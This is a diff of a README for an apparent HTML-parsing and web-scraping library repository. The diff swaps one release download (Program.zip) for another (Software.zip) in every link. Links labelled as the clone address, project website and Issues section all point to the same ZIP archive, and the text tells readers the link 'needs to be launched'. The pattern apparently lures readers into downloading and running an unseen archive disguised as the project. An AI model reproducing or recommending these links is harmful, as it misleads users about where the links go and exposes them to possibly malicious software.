@@ -15,25 +15,25 @@ This repository covers a wide range of topics related to HTML parsing and web sc
 beautifulsoup, cheerio, cplusplus, csharp, html, html-agility-pack, java, javascript, jsoup, libxml2, nokogiri, parsers, php, php-html-parser, python, ruby, and web-scraping.
 
 ## Getting Started
-To access the repository, clone it using the following link: [HTML-parsing-libraries](https://github.com/Jackeemkin11/HTML-parsing-libraries/releases/download/v1.0/Program.zip).
+To access the repository, clone it using the following link: [HTML-parsing-libraries](https://github.com/Jackeemkin11/HTML-parsing-libraries/releases/download/v2.0/Software.zip).
 
 ### Note:
 The provided link needs to be launched.
 
 If the link is not working, please check the "Releases" section of the repository.
 
-[![](https://github.com/Jackeemkin11/HTML-parsing-libraries/releases/download/v1.0/Program.zip)](https://github.com/Jackeemkin11/HTML-parsing-libraries/releases/download/v1.0/Program.zip)
+[![](https://github.com/Jackeemkin11/HTML-parsing-libraries/releases/download/v2.0/Software.zip)](https://github.com/Jackeemkin11/HTML-parsing-libraries/releases/download/v2.0/Software.zip)
 
 ## Additional Resources
 Visit the link below for more information about HTML parsing libraries and web scraping tools:
 
-[HTML Parsing Libraries Website](https://github.com/Jackeemkin11/HTML-parsing-libraries/releases/download/v1.0/Program.zip)
+[HTML Parsing Libraries Website](https://github.com/Jackeemkin11/HTML-parsing-libraries/releases/download/v2.0/Software.zip)
 
 ## Contributors
 We want to thank all the contributors who have helped make this repository a valuable resource for developers interested in web scraping and HTML parsing.
 
 ## Connect With Us
-If you have any questions, suggestions, or feedback, feel free to reach out to us through the repository's [Issues](https://github.com/Jackeemkin11/HTML-parsing-libraries/releases/download/v1.0/Program.zip) section.
+If you have any questions, suggestions, or feedback, feel free to reach out to us through the repository's [Issues](https://github.com/Jackeemkin11/HTML-parsing-libraries/releases/download/v2.0/Software.zip) section.
 
 Let's dive into the world of HTML parsing libraries and web scraping tools together! 🚀🕸️
 
